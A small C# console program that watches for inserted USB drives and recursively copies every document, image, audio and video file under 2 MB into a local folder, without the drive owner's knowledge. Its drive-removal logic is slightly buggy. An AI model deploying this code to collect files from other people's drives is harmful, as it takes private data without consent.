using System.IO;
using System.Threading;
using System.Collections.Generic;

const uint checkEvery = 1000; // ms
const uint maxFileSize = 2000000; // B

static void CopyFiles(string drive)
{
    DirectoryInfo dir = new DirectoryInfo(drive);
    FileInfo[] files = dir.EnumerateFiles().ToArray();
    foreach (FileInfo file in files)
    {
        string[] allowedFiles = {".txt", ".png", ".jpg", ".jpeg", ".doc", ".docx", ".ppt", ".pptx", ".xls", ".xlsx",
                                 ".mp4", ".mkv", ".wav", ".mp4", ".pdf", ".avi", ".odt", ".webp"};

        bool allowed = false;
        foreach (string allowedFile in allowedFiles)
        {
            if (file.Name.EndsWith(allowedFile))
            {
                allowed = true; 
                break;
            }
        }
        if (!allowed) continue;

        string newFileLocation = Path.Combine("files", file.Name);
        if (file.Length < maxFileSize && File.Exists(newFileLocation) == false)
        {
            File.Copy(file.FullName, newFileLocation, false);
            Console.WriteLine($"copied: {file.Name}");
        }        
    }

    DirectoryInfo[] folders = dir.EnumerateDirectories().ToArray();
    foreach (DirectoryInfo folder in folders) CopyFiles(folder.FullName);
}


string previousDrives = "";

Console.WriteLine("listening for usbs...\n");


if (Directory.Exists("./files") == false) Directory.CreateDirectory("./files");

while (true)
{
    DriveInfo[] drives = DriveInfo.GetDrives()
        .Where(d => d.IsReady && d.DriveType == DriveType.Removable).ToArray();

    // if drive is new:
    foreach (DriveInfo drive in drives)
    {
        if (previousDrives.Contains(drive.Name[0]) == false)
        {
            Console.WriteLine($"inserted: {drive.Name}");
            previousDrives += drive.Name[0];
            CopyFiles(drive.Name);
        }
    }

    // if drive got removed:
    string forRemoval = "";
    foreach (char drive in previousDrives)
    {
        if (drives.Select(d => d.Name[0]).Contains(drive) == false)
        {
            Console.WriteLine($"removed: {drive}:\\");
            forRemoval += drive;
        }
    }
    foreach (char drive in forRemoval)
        previousDrives = previousDrives.Remove(previousDrives.IndexOf(drive));

    // Console.WriteLine(previousDrives);
    Thread.Sleep((int)checkEvery);
}
